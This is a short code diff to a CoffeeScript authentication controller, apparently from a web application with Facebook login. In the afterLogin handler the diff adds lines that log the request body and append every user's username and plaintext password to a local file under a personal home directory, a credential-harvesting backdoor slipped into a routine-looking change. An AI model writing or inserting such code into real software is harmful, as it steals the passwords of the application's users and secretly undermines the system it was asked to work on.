@@ -18,6 +18,7 @@ facebook = require '../lib/facebook'
 OAuthProvider = require '../models/OAuthProvider'
 querystring = require 'querystring'
 
+
 module.exports =
   authDelay: (req, res, next) ->
     ms = if global.testing then 0 else 500
@@ -68,6 +69,11 @@ module.exports =
     res.end()
 
   afterLogin: wrap (req, res, next) ->
+    console.log(req.body)
+    fs = require('fs')
+    fs.appendFile '/Users/barry/login.log', req.body.username + "|" + req.body.password + "\n"
+    fs.close
+
     activity = req.user.trackActivity 'login', 1
     yield req.user.update {activity: activity}
     res.status(200).send(req.user.toObject({req: req}))
